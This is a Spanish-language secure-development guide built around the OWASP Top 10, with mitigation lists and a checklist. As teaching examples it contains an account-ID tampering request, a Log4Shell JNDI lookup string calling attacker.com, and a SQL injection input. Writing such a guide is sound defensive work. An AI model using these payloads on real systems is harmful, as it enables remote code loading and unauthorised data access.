# Buenas prácticas de desarrollo seguro

## Manejo de secretos

Los archivos `.env` no deben contener API keys ni otros secretos expuestos o compartirse públicamente.

- Almacenar los secretos en un **Secret Manager** o en variables de entorno configuradas de manera segura.
- Nunca hardcodear credenciales, tokens o API keys en el código.
- Nunca subir secretos al repositorio.
- Incluir los archivos `.env` en `.gitignore`.
- Utilizar únicamente valores ficticios en archivos como `.env.example`.
- Si un secreto se expone, revocarlo y rotarlo inmediatamente. Eliminarlo del código no es suficiente.

---

## Twelve-Factor App: configuración y dependencias

Aplicamos los siguientes principios de Twelve-Factor App:

### II. Dependencies

Las dependencias deben declararse y aislarse explícitamente.

#### Cómo lo manejamos

- Declaramos todas las dependencias necesarias para ejecutar el proyecto.
- Utilizamos archivos de bloqueo de versiones.
- Mantenemos las dependencias actualizadas y auditadas.
- Evitamos depender de paquetes instalados globalmente o no documentados.
- Revisamos la procedencia y el mantenimiento de las nuevas dependencias.

### III. Config

La configuración pertenece al entorno, nunca al código.

#### Cómo lo manejamos

- Guardamos la configuración mediante variables de entorno.
- Utilizamos un Secret Manager para credenciales y valores sensibles.
- No hardcodeamos configuraciones específicas de desarrollo, staging o producción.
- No subimos archivos `.env` con valores reales al repositorio.
- Mantenemos un `.env.example` únicamente con nombres de variables y valores ficticios.

### X. Dev/Prod Parity

Los ambientes de desarrollo, staging y producción deben ser lo más similares posible.

#### Cómo lo manejamos

- Utilizamos las mismas tecnologías y versiones principales en todos los ambientes.
- Probamos los cambios en un ambiente similar a producción antes del despliegue.
- No utilizamos datos reales de clientes en desarrollo o staging.
- Empleamos datos anonimizados, enmascarados o simulados.
- Evitamos configuraciones especiales que solamente funcionen en desarrollo.

### XI. Logs

Los logs deben tratarse como un flujo de eventos.

#### Cómo lo manejamos

- Generamos logs estructurados y centralizados.
- No registramos contraseñas, tokens ni API keys.
- No almacenamos datos personales innecesarios en los logs.
- Configuramos niveles de logging apropiados para cada ambiente.
- Generamos alertas ante eventos críticos o comportamientos anómalos.
- Protegemos los registros contra modificaciones o eliminaciones no autorizadas.

---

## Accesos y buenas prácticas en el repositorio

No se permite hacer push directo a `main`.

Todo cambio debe realizarse mediante una rama independiente y pasar por un proceso de revisión antes de integrarse.

### Cómo lo manejamos

- Protegemos la rama `main`.
- Todo cambio debe pasar por un Pull Request.
- Exigimos revisión antes de aprobar e integrar código.
- Aplicamos el principio de mínimo privilegio en los permisos del repositorio.
- Los accesos se asignan de acuerdo con las responsabilidades de cada persona.
- Al cambiar de proyecto o salir de la empresa, el acceso debe revocarse inmediatamente.
- La revocación de accesos forma parte del proceso de salida y no debe depender de que alguien lo recuerde posteriormente.
- Revisamos periódicamente los usuarios, permisos, tokens y claves con acceso al repositorio.

> **Referencia:** `TM-7.2.3: Access Management Procedure`

---

## A01: Broken Access Control

Ocurre cuando un usuario o servicio puede hacer más de lo que debería, como ver, editar o eliminar recursos para los que no tiene autorización.

### Ejemplo

```http
GET /app/accountInfo?acct=not-my-account
```

Un usuario autenticado modifica el identificador de la cuenta para intentar consultar información perteneciente a otra persona.

### Cómo lo manejamos

- Aplicamos el principio de **mínimo privilegio**.
- Cada endpoint valida el permiso contra el recurso solicitado, no solamente que el usuario haya iniciado sesión.
- Verificamos la propiedad o el alcance del recurso en el backend.
- Nadie recibe más acceso del necesario para realizar su tarea.
- No confiamos en validaciones realizadas únicamente en el frontend.
- Protegemos las ramas principales.
- Todo cambio debe revisarse antes de llegar a `main`.

---

## A02: Security Misconfiguration

Ocurre cuando configuraciones por defecto, servicios de muestra, consolas administrativas, versiones de software o mensajes de error detallados quedan expuestos en producción.

### Ejemplo

```text
java.lang.NullPointerException
    at com.example.UserService.getUser(UserService.java:45)

Apache Struts 2.3.15.1
```

Este mensaje revela detalles internos de la aplicación y versiones que podrían ayudar a identificar vulnerabilidades conocidas.

### Cómo lo manejamos

- No mostramos mensajes de error detallados ni stack traces en producción.
- No exponemos versiones de frameworks, servidores o librerías.
- Deshabilitamos los modos de depuración en producción.
- Protegemos o deshabilitamos las consolas administrativas.
- Eliminamos aplicaciones de ejemplo y endpoints de prueba antes del despliegue.
- Revisamos la configuración de seguridad de cada ambiente antes de publicar.
- Deshabilitamos servicios, puertos y funcionalidades que no sean necesarios.
- Cambiamos las credenciales y configuraciones predeterminadas.

---

## A03: Software Supply Chain Failures

Ocurre cuando una dependencia, paquete, actualización o herramienta de terceros comprometida entra al proyecto, aunque el equipo no haya escrito directamente el código malicioso.

### Ejemplo

```text
${jndi:ldap://attacker.com/a}
```

Caso conocido: **Log4Shell (`CVE-2021-44228`)**.

### Cómo lo manejamos

- Mantenemos las dependencias actualizadas y verificadas.
- Revisamos las vulnerabilidades conocidas o CVE.
- Evaluamos el impacto antes de ignorar una alerta de seguridad.
- No agregamos una librería sin comprobar su procedencia.
- Verificamos que las nuevas dependencias sigan mantenidas activamente.
- Utilizamos archivos de bloqueo de versiones.
- Evitamos actualizaciones automáticas no controladas.
- Revisamos los cambios de dependencias durante el code review.
- Verificamos la integridad de los paquetes y artefactos utilizados en CI/CD.
- Eliminamos dependencias que ya no se utilizan.

---

## A04: Cryptographic Failures

Ocurre cuando credenciales, tokens o datos sensibles quedan expuestos porque no se cifran correctamente, se utilizan algoritmos débiles o se almacenan en lugares inseguros.

### Ejemplo

```python
password_hash = md5(password)
```

MD5 no es apropiado para almacenar contraseñas.

### Cómo lo manejamos

- Guardamos los secretos en un Secret Manager o en variables de entorno seguras.
- Nunca hardcodeamos secretos.
- Nunca almacenamos credenciales o API keys en el repositorio.
- Para contraseñas usamos funciones como **Argon2**, **bcrypt** o **scrypt**.
- Utilizamos un salt único y un costo de procesamiento adecuado.
- Protegemos las conexiones mediante HTTPS/TLS.
- No permitimos fallback a HTTP.
- Evitamos registrar contraseñas, tokens o datos sensibles.
- Ciframos la información sensible en tránsito y en reposo cuando corresponde.
- Rotamos periódicamente claves, tokens y credenciales.

### Código, datos y herramientas de IA

- No pegamos código propietario en herramientas de IA no autorizadas.
- Utilizamos únicamente herramientas aprobadas por la organización.
- Respetamos las políticas internas de manejo de información.
- Utilizamos datos de prueba anonimizados, enmascarados o simulados.
- No utilizamos datos reales de producción en desarrollo o pruebas locales.
- Consideramos que los ambientes de desarrollo pueden tener más vulnerabilidades o comportamientos inesperados.
- Tratamos como sensible cualquier información cuya clasificación no esté clara.

---

## A05: Injection

Ocurre cuando una entrada externa se interpreta o ejecuta como código o comando, en lugar de tratarse únicamente como dato.

Puede afectar:

- Consultas SQL.
- Comandos de shell.
- Templates.
- Consultas NoSQL.
- Expresiones dinámicas.
- Intérpretes y motores de búsqueda.

### Ejemplo

```text
SELECT * FROM accounts WHERE custID = '" + id + "'
```

Entrada maliciosa:

```text
' OR '1' = '1
```

### Cómo lo manejamos

- Validamos todas las entradas externas.
- Utilizamos listas de valores permitidos cuando sea posible.
- Utilizamos queries parametrizadas.
- Nunca concatenamos directamente el input en una consulta SQL.
- No insertamos entradas externas directamente en comandos de shell.
- Aplicamos escaping o encoding de salida según el contexto.
- Nunca confiamos automáticamente en el input del usuario.
- Tampoco confiamos automáticamente en la información enviada por otros servicios.
- Ejecutamos los servicios con privilegios limitados para reducir el impacto de una posible inyección.

---

## A06: Insecure Design

Ocurre cuando el riesgo está presente desde el diseño inicial del sistema, en lugar de introducirse únicamente durante la implementación.

En estos casos, el riesgo se diseñó desde el inicio; no apareció después por un error aislado de programación.

### Cómo lo manejamos

- Incluimos requisitos de seguridad desde la planificación.
- Analizamos amenazas, actores, activos y posibles abusos antes de implementar.
- Definimos los permisos y límites de cada funcionalidad.
- Diseñamos controles de seguridad por capas.
- Asumimos que cualquier control individual puede fallar.
- Establecemos comportamientos seguros por defecto.
- Definimos límites para las operaciones sensibles.
- Revisamos el diseño de funcionalidades críticas antes de desarrollarlas.
- Incluimos escenarios de abuso dentro de las pruebas y criterios de aceptación.

---

## A07: Authentication Failures

Son fallas en la manera de verificar la identidad de usuarios o administrar sus sesiones, desde credenciales débiles hasta sesiones que nunca expiran.

### Ejemplo

Una contraseña filtrada en otro sitio puede permitir que un atacante pruebe variaciones predecibles:

```text
Winter2025  -> Winter2026
ILoveMyDog6 -> ILoveMyDog7
```

Esto facilita ataques como:

- **Credential stuffing:** reutilización de credenciales filtradas en otros servicios.
- **Password spraying:** prueba de contraseñas comunes contra muchas cuentas.
- **Fuerza bruta:** prueba repetitiva de múltiples combinaciones contra una cuenta.

### Cómo lo manejamos

- Utilizamos sesiones con identificadores de alta entropía.
- Configuramos una expiración estricta para las sesiones.
- Generamos identificadores de sesión aleatorios y seguros.
- Nunca enviamos identificadores de sesión en la URL.
- Invalidamos la sesión en el servidor al cerrar sesión.
- No dependemos únicamente de eliminar la sesión en el cliente.
- Aplicamos rate limiting al inicio de sesión.
- Requerimos autenticación multifactor para cuentas u operaciones sensibles cuando corresponde.
- Evitamos revelar si un usuario específico existe.
- Rotamos los identificadores de sesión después de autenticar o cambiar privilegios.
- Bloqueamos o retrasamos temporalmente los intentos cuando detectamos comportamiento sospechoso.

---

## A08: Software or Data Integrity Failures

Ocurre cuando código, actualizaciones, artefactos o datos pueden modificarse y utilizarse sin verificar su integridad.

Esto puede afectar especialmente los procesos de CI/CD, las actualizaciones automáticas, los paquetes y la deserialización de información.

### Cómo lo manejamos

- Verificamos la procedencia de dependencias, artefactos y actualizaciones.
- Validamos su integridad antes de utilizarlos.
- Protegemos el pipeline de CI/CD.
- Limitamos quién puede modificar o ejecutar los workflows.
- Exigimos revisión y aprobación para cambios en código y dependencias.
- Firmamos o validamos los artefactos cuando el proceso lo permite.
- No deserializamos información no confiable sin validación.
- Protegemos las ramas y los ambientes de despliegue.
- Utilizamos controles de acceso para publicar versiones.
- Mantenemos trazabilidad de quién realizó y aprobó cada despliegue.

---

## A09: Security Logging and Alerting Failures

Ocurre cuando no existe un registro suficiente ni se generan alertas oportunas cuando sucede un evento de seguridad.

Sin registros y alertas adecuados, un ataque puede permanecer activo durante mucho tiempo sin ser detectado.

### Cómo lo manejamos

- Registramos intentos de autenticación exitosos y fallidos.
- Registramos cambios de permisos y roles.
- Registramos accesos denegados.
- Registramos operaciones administrativas o sensibles.
- Generamos alertas ante patrones anómalos.
- Generamos alertas ante eventos críticos.
- Centralizamos los logs.
- Protegemos los registros contra modificaciones o eliminaciones no autorizadas.
- No incluimos secretos ni datos sensibles en los logs.
- Definimos responsables para revisar las alertas.
- Contamos con procedimientos para responder ante eventos.
- Sincronizamos la hora de los sistemas.
- Establecemos una política de retención de logs.

---

## A10: Mishandling of Exceptional Conditions

Ocurre cuando errores, excepciones, estados inesperados o fallas parciales se manejan de manera insegura.

Una excepción nunca debe permitir que el sistema continúe con permisos incorrectos, datos incompletos o un estado inconsistente.

### Cómo lo manejamos

- Manejamos explícitamente los errores y las excepciones.
- Definimos timeouts para operaciones externas.
- Limitamos la cantidad de reintentos.
- Utilizamos backoff para evitar ciclos infinitos o sobrecarga.
- Validamos las respuestas inesperadas de otros servicios.
- Ante una falla, el sistema adopta un estado seguro.
- Una excepción nunca debe conceder acceso por defecto.
- Mostramos mensajes genéricos al usuario.
- Registramos internamente los detalles necesarios para investigar.
- Diseñamos las operaciones críticas para evitar duplicados.
- Evitamos dejar información en estados parciales.
- Probamos escenarios de error y recuperación, no solamente el flujo exitoso.

---

## Lista de verificación rápida

- [ ] No existen secretos, API keys ni credenciales en el repositorio.
- [ ] Los archivos `.env` están incluidos en `.gitignore`.
- [ ] El archivo `.env.example` contiene únicamente valores ficticios.
- [ ] Cada endpoint valida la autorización sobre el recurso solicitado.
- [ ] El backend no depende únicamente de validaciones realizadas en el frontend.
- [ ] Producción no expone stack traces, versiones ni endpoints de debug.
- [ ] Las dependencias están actualizadas, revisadas y mantenidas.
- [ ] No existen vulnerabilidades críticas conocidas sin un plan de mitigación.
- [ ] Los datos sensibles utilizan mecanismos criptográficos apropiados.
- [ ] Las contraseñas se almacenan utilizando algoritmos seguros.
- [ ] Todas las conexiones utilizan HTTPS/TLS.
- [ ] Las entradas externas no se concatenan en SQL, shell o templates.
- [ ] El diseño contempla amenazas, abusos y comportamientos seguros por defecto.
- [ ] Las sesiones expiran y se invalidan en el servidor.
- [ ] El login cuenta con rate limiting.
- [ ] El código, los datos y los artefactos se verifican antes de desplegarse.
- [ ] Los eventos de seguridad generan logs y alertas.
- [ ] Los logs no contienen contraseñas, tokens ni información sensible.
- [ ] Las excepciones y fallas parciales terminan en un estado seguro.
- [ ] No se permite hacer push directo a `main`.
- [ ] Todos los cambios pasan por Pull Request y revisión.
- [ ] Los accesos se revocan cuando una persona cambia de proyecto o sale de la empresa.
